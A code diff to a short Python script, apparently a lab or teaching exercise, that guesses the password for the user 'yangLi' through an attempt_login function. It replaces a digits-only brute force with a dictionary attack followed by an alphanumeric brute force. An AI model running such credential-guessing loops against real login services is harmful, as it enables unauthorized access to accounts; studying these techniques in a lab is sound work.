@@ -18,13 +18,27 @@ def attempt_login(username, password):
 username = "yangLi"
 success = False  # Flag to indicate if the login was successful
 # password = '100'
-for password_length in range(1, 5):
-    if success:
-        break
-    for password in itertools.product(string.digits, repeat=password_length):
-        password_str = ''.join(password)
-        if attempt_login(username, password_str):
-            success = True  # Set the flag to True when login is successful
-            break  # Exit the password loop
-            #exit()
 
+# Load the dictionary of passwords
+password_file_path = './dictionary.txt'
+with open(password_file_path, 'r') as file:
+    passwords = file.read().splitlines()
+
+# Attempt to login using each password from the dictionary
+for password in passwords:
+    if attempt_login(username, password):
+        success = True
+        break
+
+if not success:
+    # Now let's attempt a brute force attack with a combination of digits and letters
+    characters = string.ascii_letters + string.digits  # Combining letters and digits
+    for password_length in range(2, 7):  # Adjust the range as needed
+        if success:
+            break
+        for password in itertools.product(characters, repeat=password_length):
+            password_str = ''.join(password)
+            if attempt_login(username, password_str):
+                success = True
+                break 
+            
